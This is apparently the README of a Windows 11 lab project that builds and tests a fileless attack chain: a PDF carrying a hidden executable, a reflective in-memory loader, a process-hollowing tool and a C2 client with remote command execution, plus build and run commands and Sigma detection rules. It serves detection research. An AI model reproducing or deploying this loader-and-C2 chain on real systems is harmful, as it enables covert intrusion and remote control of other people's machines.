# PHANTOM-X

**Advanced Fileless Threat Research — Windows 11 Internal Lab**

Research programme mapping the chain
`PDF Document → Reader → Execution Boundary → Memory Activity → Detection → Network Communication`,
with a standing rule: **observed behaviour is distinguished from assumption, and no result is claimed without evidence.**

---

## What works right now

**The attack chain is built and verified end to end.**

```
px_attack_chain.pdf
   └─ embedded PE (FlateDecode)
        └─ px_loader.exe extracts it IN MEMORY — nothing touches disk
             └─ PE mapped by hand: headers, sections, relocations, imports, protections
                  └─ entry point executed on a new thread
                       └─ payload opens a TCP session to the lab C2
                            └─ operator runs commands, gets real output back
```

```
  [PASS] chain established a C2 session through the PDF -- session=1
  [PASS] HELLO parsed -- host=KALI arch=x64 pid=296
  [PASS] latency measured -- 0.31 ms
  [PASS] EXEC 'whoami' returned output -- 'KALI\root'
  [PASS] EXEC 'cmd /c echo PHANTOM_X_CHAIN_PROOF' returned output -- 'PHANTOM_X_CHAIN_PROOF'
  [PASS] controlled session termination -- payload acknowledged EXIT
  RESULT: PASS
```

Reproduce: `python3 phase5_network/test_chain_integration.py`

---

## Ground rules

Enforced across every phase, not just stated.

1. **Defender stays on** during measurement. The Defender A/B toggle exists to produce a *documented coverage gap*, and it restores with a 60-second guard task so the VM cannot be left unprotected.
2. **No fabricated results.** Every number came from an actual run. Where a result is pending, it says pending.
3. **Structure ≠ execution.** A `/Launch` action is a request. A `VirtualAlloc` is an allocation. Reports keep these apart.
4. **Bounded scope.** The payload only ever affects its own process. No injection into unrelated processes, no persistence, no credential access, no lateral movement.
5. **Deliberately plain.** No obfuscation, no AMSI bypass, no ETW unhooking, no encrypted channel, no domain generation. A payload that evades produces no signal to analyse — which would defeat the purpose of a detection study.
6. **Cross-validate before trusting.** Every analyzer is checked against an independent implementation.
7. **Isolated by default.** The research VM is default-deny on egress and cannot reach the home network. The isolation is set up and verified before any payload is placed on the machine.

---

## Language policy

The lab targets Windows, so the components are chosen for what the platform
actually needs rather than for what is fashionable:

| Component | Language | Why |
|---|---|---|
| `px_payload.exe` | **C** (freestanding) | It is reflectively mapped by hand. A CRT startup needs a TLS index that only the Windows loader assigns, so the payload cannot link one. See the bug list below. |
| `px_loader.exe` | **C** | Same reason: it maps another PE by hand and must not depend on loader state. |
| `px_hollow.exe` | **C** | Same. |
| `px_c2.exe` | **Go** | The operator side. One static binary with no runtime dependency, cross-compiles to Linux for the Kali rig, and speaks the same wire protocol so the C payload is unchanged. |
| `px_pdfscan.exe` | **Rust** | The independent PDF scanner. Reads hostile input, so memory safety is worth having, and it must run on the VM where Python may not be installed. |
| `px_detect.exe` | **Rust** | The detection rule generator. No crates, so it builds offline and there is nothing to audit but the source. |
| Defender / Sysmon tooling | **PowerShell** | These call Windows APIs directly. PowerShell is the supported interface for `Get-MpComputerStatus` and friends. |
| PDF generation, test harnesses | **Python** | Build-time and analysis-time tooling. Runs on the host, never on the target. |

**No crate dependencies anywhere in the Rust components.** The lab VM is
often offline, and a parser that reads hostile input should not depend on
code nobody in the lab has read. The DEFLATE decoder and the SHA-256
implementation are written out in the source for that reason, and the
SHA-256 is checked against the FIPS 180-4 test vectors in its own test
module.

---

## Build everything on Windows

```powershell
cd phase3_fileless\loader
.\build_all.ps1 -C2Host 192.168.77.1 -C2Port 9001
```

Builds the payload, the loader, the hollow tool, the Go C2 server, both
Rust tools, and the carrier PDF, in dependency order. A missing toolchain
is reported as *skipped* with the reason, not as a failure — a lab
machine with only MSVC on it is a normal state.

---

## Network isolation comes first

The payload runs arbitrary commands inside the VM. The isolation is the
control that contains that risk, so it is set up and verified **before**
any payload is placed on the machine.

```
phase0_labnet/     host-only segment, default-deny egress, home-LAN blocks
                   and a verification script that probes the live network
```

See `phase0_labnet/README.md`.

---

## Windows 11 Pro VM preparation

```powershell
cd phase4_defender
.\vm_prepare.ps1 -LabFolder C:\pxvm -LabGateway 192.168.77.1 -C2Port 9001
```

Network lockdown, then the Defender posture *reported but not changed*,
then Mark-of-the-Web, then the Sysmon check.

---

## Detections

```
phase7_detection/  Sigma rules for the chain, generated by px_detect.exe
```

The rules key on what is observable. A payload that evades produces no
signal to analyse, which would defeat the purpose of a detection study.

See `phase7_detection/README.md`.

---

## Layout

```
phantom-x/
├── docs/
│   ├── phase1_experiment1.md        PDF attack surface — Phase 1 procedure + results
│   └── phase3_phase5_chain.md       the working chain: build, deploy, measure
├── phase0_labnet/                  network isolation -- RUNS FIRST
│   ├── setup_labnet.ps1            HOST: host-only segment + firewall
│   ├── setup_vm_labnet.ps1         VM: default-deny egress, home-LAN blocks
│   ├── verify_labnet.ps1           VM: proves the isolation by probing
│   └── README.md
├── phase1_pdf/
│   ├── pdf_inspector.py             read-only PDF structure & action analyzer
│   ├── rust_scanner/                INDEPENDENT Rust implementation (px_pdfscan)
│   │   ├── src/scanner.rs           PDF lexer
│   │   ├── src/parser.rs            object table, streams, filters, inflate
│   │   ├── src/analysis.rs          actions, JavaScript, embedded files
│   │   ├── src/sha256.rs            dependency-free SHA-256 (FIPS vectors)
│   │   └── src/main.rs              CLI
│   ├── validate_cross_impl.py       cross-validates Rust against Python
│   ├── make_test_pdfs.py            11 controlled test documents
│   ├── make_attack_pdf.py           builds the carrier PDF
│   ├── validate_against_pypdf.py    cross-validation vs. an independent parser
│   ├── samples/                     generated PDFs + manifest.json
│   └── reports/                     JSON reports
├── phase2_memory/
│   └── win_mem_lab.py               VirtualAlloc/Protect/Query/Free,
│                                    ReadProcessMemory, in-memory execution proof
├── phase3_fileless/
│   ├── loader/
│   │   ├── px_loader.c/.exe         PDF extractor + reflective PE mapper
│   │   ├── px_payload.c/.exe        freestanding C2 client
│   │   ├── px_hollow.c/.exe         PDF extractor + remote process mapper
│   │   ├── build_lab.sh/.ps1        rebuild everything
│   │   └── build_all.ps1            build EVERY component on Windows
│   ├── native/                      C++ native loader
│   └── dotnet/                      C# reflective loader variant
├── phase4_defender/
│   ├── vm_prepare.ps1               WINDOWS 11 PRO VM PREPARATION (one script)
│   ├── collect_defender.ps1         read-only Defender + event collector
│   ├── lab_ab_toggle.ps1            Defender A/B with guaranteed restore
│   ├── sysmon_config.xml            Sysmon telemetry configuration
│   ├── validate_sysmon_config.py    offline schema validation
│   └── sysmon_v4_90_schema.xsd      official schema manifest
├── phase5_network/
│   ├── c2_server.py                 lab C2 with sessions, latency, JSONL audit
│   ├── c2_server.go                 GO implementation of the same protocol
│   ├── c2_server_test.go            drives the REAL payload against the Go server
│   ├── test_c2_integration.py       payload-level integration test
│   └── test_chain_integration.py    FULL chain integration test
└── phase6_reports/                  structured JSON reports
└── phase7_detection/                DEFENSIVE DELIVERABLE
    ├── src/detections.rs            the Sigma rules, with their reasoning
    ├── src/main.rs                  px_detect CLI
    └── README.md
```

---

## Quick start

```bash
# build the chain
cd phase3_fileless/loader && ./build_lab.sh

# prove it works (Linux, under Wine)
python3 phase5_network/test_chain_integration.py

# Phase 1 regression
cd ../../phase1_pdf
python3 make_test_pdfs.py
python3 pdf_inspector.py samples/ --extract-dir ./quarantine --json reports/out.json
python3 validate_against_pypdf.py
```

### On Windows

```powershell
# build every native component (payload, loader, hollow, Go C2, Rust tools, PDF)
cd phase3_fileless\loader
.\build_all.ps1 -C2Host 192.168.77.1 -C2Port 9001

# isolate the VM from the home network -- THIS COMES FIRST
cd ..\..\phase0_labnet
.\setup_labnet.ps1 -Action apply -LabSubnet 192.168.77.0/24 -C2Port 9001

# on the VM
cd ..\..\phase4_defender
.\vm_prepare.ps1 -LabFolder C:\pxvm -LabGateway 192.168.77.1 -C2Port 9001
cd C:\pxvm
.\collect_defender.ps1 -Label before_chain   # prove Defender was ON
.\px_loader.exe .\px_attack_chain.pdf .\loader.log
.\collect_defender.ps1 -Label after_chain
.\lab_ab_toggle.ps1 -Action off               # guarded A/B, auto-restores
```

### Cross-validation

```bash
# the Rust PDF scanner against the Python reference
python3 phase1_pdf/validate_cross_impl.py --rust phase1_pdf/rust_scanner/target/release/px_pdfscan.exe

# the Go C2 server against the Python reference
python3 phase5_network/validate_c2_equivalence.py --go dist/native/px_c2.exe

# the Go C2 server against the REAL payload
cd phase5_network && go test -v -run TestGoC2Integration .
```

---

## Status

| Phase | Status |
|---|---|
| 0 — Network isolation | **Built and verified.** Host-only segment, default-deny egress, live-network verification |
| 1 — PDF attack surface | Experiment 1 complete (Linux side); Rust cross-check scanner built; VM reader run pending |
| 2 — Windows memory research | `win_mem_lab.py` built; VM run pending |
| 3 — Fileless techniques | **Reflective loading working.** Remaining catalogue pending |
| 4 — Defender evaluation | Collector + Sysmon config built and validated; A/B toggle built; VM preparation script built; VM run pending |
| 5 — Network research | **C2 rig working and tested** in both Python and Go, cross-validated against each other and against the real payload |
| 6 — Reporting infrastructure | JSON schema established |
| 7 — Detections | **Sigma rules written** for the chain, with the observation behind each one stated |

---

## Bugs caught by cross-checking

Every one of these produced a confident-looking wrong answer and would have
been shipped as a result:

- `qpdf --check` caught off-by-one `/Contents` references in the PDF generator that our own parser accepted happily.
- The `pypdf` harness caught double-counted actions and lost JavaScript records caused by dereferencing before identity resolution.
- The official Sysmon schema manifest caught 30 invalid condition operators and two conflicting rule blocks in the Sysmon configuration.
- A missing loop-variable reset made the reflective loader's section-protection loop **never execute** — the image stayed non-executable and the entry point died with a misleading fault.
- A conventional EXE cannot be reflectively loaded: its CRT startup needs a TLS index only the Windows loader assigns. Rebuilt freestanding rather than faking loader state.
- A buffer-aliasing bug turned the C2 host into the port number (`connecting to 9306:9306`).
- The payload's own `px_vfmt` did not understand `%ld`, so the exit code in every `RESULT` line reached the server as the literal text `%ld`. Nothing complained: the value was a non-empty string, so the server reported `exit_code=%ld` and could not tell a success from a failure. It also ignored zero-padding, so the timestamp in the marker file came out as `202611110940` instead of `2026-11-11 09:40`. Found by writing the Go C2 server and reading what the C payload actually sent.
- The Go C2 server and the Python reference were compared field by field against the same payload binary. Two implementations of one protocol is what makes that kind of bug visible; a single implementation agreeing with itself proves nothing.
- `setup_labnet.ps1` used `Test-Path 'a' -or Test-Path 'b'`, which PowerShell parses as a parameter named `-or`. The VMware host-only check silently never ran, which would have left the VM bridged onto the home LAN while the script reported success. Caught by running the script instead of only parsing it.
- `px_path_next_to_image` used `strchr` where it needed `strrchr`, so it cut the image path at the **first** backslash: `C:\dir\payload.exe` became `C:`. The marker file was still written, but to the root of the drive instead of next to the payload, so an operator looking for it beside the binary never found it. Found by building with MSVC — which had never actually been run against this file — and noticing the file was missing.
- `build_lab.ps1` is the documented MSVC build path and had never been run. The payload used `__builtin_va_list` and GCC-only `__builtin_va_arg`, which MSVC does not have, and defined `memcpy`/`memset`/`memmove`, which MSVC rejects as intrinsics. The MSVC path could not have compiled the file it claimed to build.
- `px_strcpy` was used 250 lines before its definition, with only a forward declaration. GCC accepts that with a warning; MSVC does not accept it at all.
- The formatter's padding calculation was `width - len` with no guard. With no width given that is `0 - len`, which underflows to a huge unsigned number, and the formatter filled the buffer with spaces. The first version of the fix for this had the same class of bug in the numeric branch and reversed the digits as well, turning port 39999 into 99993. Three formatter bugs in total, all caught by the self-test that now guards them.
- The Go C2 server's `Accept()` blocked forever, so `--duration` never fired and the server could not shut itself down. The Python server had no such problem, which is exactly why writing the comparison was worth the effort.
- The Rust scanner did not walk the catalog's `/Names` JavaScript tree, so it missed the script in a document whose only JavaScript was a named entry. Found by the cross-validation harness against the Python reference.
- The Rust scanner counted one action twice when the same action dictionary was reachable from both a name tree and a page's `/AA`. Found by the same harness, which compared counts rather than assuming they matched.
